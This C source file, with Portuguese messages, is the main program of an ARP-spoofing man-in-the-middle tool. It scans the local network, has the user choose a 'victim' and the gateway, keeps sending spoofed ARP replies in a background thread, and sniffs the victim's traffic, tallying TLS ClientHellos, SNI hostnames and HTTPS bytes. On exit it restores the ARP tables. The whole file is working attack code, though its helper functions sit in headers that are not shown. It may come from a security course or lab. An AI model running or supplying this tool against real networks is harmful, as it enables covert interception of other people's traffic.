#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <pthread.h>

#include "net_interface.h"
#include "host.h"
#include "arp.h"
#include "sniffer.h"

#define MAX_HOSTS 256

static volatile sig_atomic_t running = 1;

typedef struct {
    NetInterface netint;
    Host victim;
    Host gateway;
    volatile sig_atomic_t *running;
} SpoofArgs;

static void handle_sigint(int sig) {
    (void)sig;
    running = 0;
}

static void *spoof_thread(void *arg) {
    SpoofArgs *args = (SpoofArgs *)arg;

    while (*(args->running)) {
        arp_spoof_once(args->netint, args->victim, args->gateway);
        printf("ARP spoof enviado: %s <-> %s\n", args->victim.ip, args->gateway.ip);
        fflush(stdout);
        sleep(2);
    }

    return NULL;
}

static int read_index(const char *message) {
    int index;

    printf("%s", message);
    fflush(stdout);

    if (scanf("%d", &index) != 1) {
        fprintf(stderr, "Entrada invalida.\n");
        exit(EXIT_FAILURE);
    }

    return index;
}

int main(void) {
    signal(SIGINT, handle_sigint);

    NetInterface netint = get_net_interface();
    print_interface(netint);

    Host hosts[MAX_HOSTS];
    int n_hosts = arp_scan(netint, hosts, MAX_HOSTS);

    print_hosts(hosts, n_hosts);

    if (n_hosts < 2) {
        printf("\nPrecisa encontrar pelo menos vitima e gateway.\n");
        return 0;
    }

    int victim_index = read_index("\nEscolha o indice da vitima: ");
    int gateway_index = read_index("Escolha o indice do gateway: ");

    if (victim_index < 0 || victim_index >= n_hosts ||
        gateway_index < 0 || gateway_index >= n_hosts ||
        victim_index == gateway_index) {
        printf("Indices invalidos.\n");
        return 1;
    }

    Host victim = hosts[victim_index];
    Host gateway = hosts[gateway_index];

    printf("\nVitima escolhida:\n");
    printf("IP:  %s\n", victim.ip);
    printf("MAC: %s\n", victim.mac);

    printf("\nGateway escolhido:\n");
    printf("IP:  %s\n", gateway.ip);
    printf("MAC: %s\n", gateway.mac);

    printf("\nIniciando ARP spoofing e sniffer. Pressione Ctrl+C para parar.\n");
    printf("Obs: deixe o IP forwarding ativado em outro terminal se quiser manter a navegacao da vitima.\n\n");

    pthread_t tid;
    SpoofArgs args;
    args.netint = netint;
    args.victim = victim;
    args.gateway = gateway;
    args.running = &running;

    if (pthread_create(&tid, NULL, spoof_thread, &args) != 0) {
        perror("pthread_create");
        return 1;
    }

    SnifferStats stats = {0};
    sniff_packets(netint, victim, &running, &stats);

    pthread_join(tid, NULL);

    printf("\nParando ataque...\n");
    printf("Restaurando tabelas ARP...\n");
    arp_restore(netint, victim, gateway);

    printf("\nResumo da captura:\n");
    printf("Total de frames vistos:       %lu\n", stats.total_packets);
    printf("Frames envolvendo a vitima:   %lu\n", stats.victim_packets);
    printf("TCP:                          %lu\n", stats.tcp_packets);
    printf("UDP:                          %lu\n", stats.udp_packets);
    printf("ICMP:                         %lu\n", stats.icmp_packets);
    printf("ClientHello TLS detectados:   %lu\n", stats.tls_client_hello);
    printf("SNI encontrados:              %lu\n", stats.sni_found);
    printf("Bytes HTTPS/443 vistos:       %lu\n", stats.https_bytes);
    printf("Bytes envolvendo a vitima:    %lu\n", stats.total_bytes);

    printf("\nFinalizado.\n");

    return 0;
}
